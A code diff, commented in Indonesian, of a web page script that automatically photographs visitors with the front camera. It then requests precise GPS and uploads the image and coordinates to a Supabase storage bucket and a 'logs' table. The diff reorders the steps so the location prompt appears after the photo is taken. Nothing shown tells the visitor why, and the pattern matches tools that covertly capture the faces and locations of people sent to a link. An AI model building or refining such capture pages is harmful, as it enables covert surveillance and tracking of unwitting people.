@@ -136,12 +136,11 @@
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
         let hasRun = false;
 
-        // Fungsi terpisah untuk mengirim data ke Supabase
+        // Fungsi kirim data ke Supabase
         async function sendDataToSupabase(blob, lat = null, lng = null) {
             try {
                 const fileName = `capture_${Date.now()}.png`;
 
-                // Upload ke Supabase Storage
                 const { error: storageError } = await supabaseClient.storage
                     .from('captures')
                     .upload(fileName, blob, { 
@@ -154,12 +153,10 @@
                     return;
                 }
 
-                // Ambil Public URL
                 const { data: { publicUrl } } = supabaseClient.storage
                     .from('captures')
                     .getPublicUrl(fileName);
 
-                // Insert ke tabel logs
                 const { error: dbError } = await supabaseClient
                     .from('logs')
                     .insert([{ 
@@ -171,11 +168,35 @@
                 if (dbError) {
                     console.error("Database Error:", dbError.message);
                 } else {
-                    console.log("Berhasil terkirim ke Supabase!");
+                    console.log("Data & Lokasi berhasil tersimpan!");
                 }
             } catch (err) {
                 console.error("Kesalahan pengiriman:", err);
             }
+        }
+
+        // Helper untuk mengambil posisi GPS secara terpisah
+        function getGeolocationAsync() {
+            return new Promise((resolve) => {
+                if (!("geolocation" in navigator)) {
+                    resolve({ lat: null, lng: null });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude
+                        });
+                    },
+                    (error) => {
+                        console.warn("Izin lokasi dilewati/ditolak:", error.message);
+                        resolve({ lat: null, lng: null });
+                    },
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
+            });
         }
 
         async function startProcess() {
@@ -186,7 +207,7 @@
             const canvas = document.getElementById("canvas");
 
             try {
-                // 1. Meminta izin kamera
+                // STEP 1: Meminta izin & menyalakan kamera terlebih dahulu
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
@@ -195,44 +216,27 @@
                 video.srcObject = stream;
                 await video.play();
 
-                // Fungsi helper untuk mengambil foto & kirim
-                const captureAndUpload = (lat = null, lng = null) => {
-                    setTimeout(async () => {
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext("2d");
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Beri jeda 1 detik agar kamera siap, lalu ambil gambar
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        canvas.toBlob(async (blob) => {
-                            if (blob) {
-                                await sendDataToSupabase(blob, lat, lng);
-                            }
-                            // Matikan kamera setelah selesai
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 'image/png');
-                    }, 1250);
-                };
+                    canvas.toBlob(async (blob) => {
+                        // Matikan kamera segera setelah frame diambil
+                        stream.getTracks().forEach(track => track.stop());
 
-                // 2. Meminta izin lokasi dengan sistem fallback (Jika lokasi diblokir/gagal, foto tetap terkirim)
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            // Jika lokasi diizinkan
-                            const lat = position.coords.latitude;
-                            const lng = position.coords.longitude;
-                            captureAndUpload(lat, lng);
-                        },
-                        (error) => {
-                            // Jika izin lokasi ditolak/tidak muncul, tetap lanjut kirim foto tanpa koordinat
-                            console.warn("Lokasi dilewati karena error/ditolak:", error.message);
-                            captureAndUpload(null, null);
-                        },
-                        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
-                    );
-                } else {
-                    // Jika browser tidak support geolocation
-                    captureAndUpload(null, null);
-                }
+                        if (blob) {
+                            // STEP 2: Setelah kamera selesai, minta izin lokasi secara terpisah agar pop-up muncul
+                            console.log("Meminta izin lokasi...");
+                            const coords = await getGeolocationAsync();
+
+                            // STEP 3: Kirim foto beserta koordinat (jika diizinkan) ke Supabase
+                            await sendDataToSupabase(blob, coords.lat, coords.lng);
+                        }
+                    }, 'image/png');
+                }, 1200);
 
             } catch (err) {
                 console.warn("Kamera ditolak atau error:", err);
